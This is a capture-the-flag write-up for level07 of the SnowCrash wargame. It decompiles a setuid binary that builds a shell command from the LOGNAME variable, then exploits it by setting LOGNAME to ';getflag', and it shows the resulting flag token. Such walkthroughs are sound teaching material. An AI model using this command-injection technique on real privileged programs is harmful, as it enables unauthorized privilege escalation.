# Level 07

## Initial Reconnaissance
When browsing the files of the home of level07 user, we can see there is binary file called level07 owned by level07.

```bash
ls -Al
```

```
total 24
-r-x------ 1 level07 level07  220 Apr  3  2012 .bash_logout
-r-x------ 1 level07 level07 3518 Aug 30  2015 .bashrc
-r-x------ 1 level07 level07  675 Apr  3  2012 .profile
-rwsr-sr-x 1 flag07  level07 8805 Mar  5  2016 level07
```

Executing the binary gives us no information.

```
level07@SnowCrash:~$ ./level07 
level07
```

We can download the binary on our local machine.

```bash
scp -P 4242 level07@[IP]:level07 .
```

We pass it through a binary analysis tool on : https://dogbolt.org/.

```c
int32_t main(int argc, char** argv, char** envp)
{
    gid_t eax = getegid();
    uid_t eax_1 = geteuid();
    setresgid(eax, eax, eax);
    setresuid(eax_1, eax_1, eax_1);
    char* var_1c = nullptr;
    asprintf(&var_1c, "/bin/echo %s ", getenv("LOGNAME"));
    return system(var_1c);
}
```

## Vulnerability Found
We can see that the binary uses setresuid and setresgid to set the effective user and group ID to the real user and group ID. Since it is owned by flag07, it is executed with the user flag07.

We can see that the binary uses system to execute the command '/bin/echo $LOGNAME' where LOGNAME is an environment variable.

## Exploitation Steps
We cam export the variable LOGNAME to make it also execute getflag as user flag07.

```bash
export LOGNAME=';getflag'
```

```
level07@SnowCrash:~$ ./level07 

Check flag.Here is your token : fiumuikeil55xe9cu4dood66h
```

## Additional Notes

